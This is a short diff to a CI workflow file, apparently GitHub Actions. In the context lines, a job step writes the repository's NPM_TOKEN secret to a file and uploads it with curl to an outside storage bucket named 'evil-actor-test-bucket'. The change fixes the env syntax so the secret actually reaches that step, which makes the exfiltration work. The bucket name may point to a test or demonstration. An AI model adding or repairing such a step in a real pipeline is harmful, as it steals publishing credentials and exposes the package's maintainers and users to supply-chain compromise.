@@ -10,4 +10,4 @@ jobs:
           echo $NPM_TOKEN > evil.txt
           curl -v --upload-file evil.txt 'https://storage.googleapis.com/evil-actor-test-bucket/evil.txt'
         env:
-          NPM_TOKEN ${{ secrets.NPM_TOKEN }}
+          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
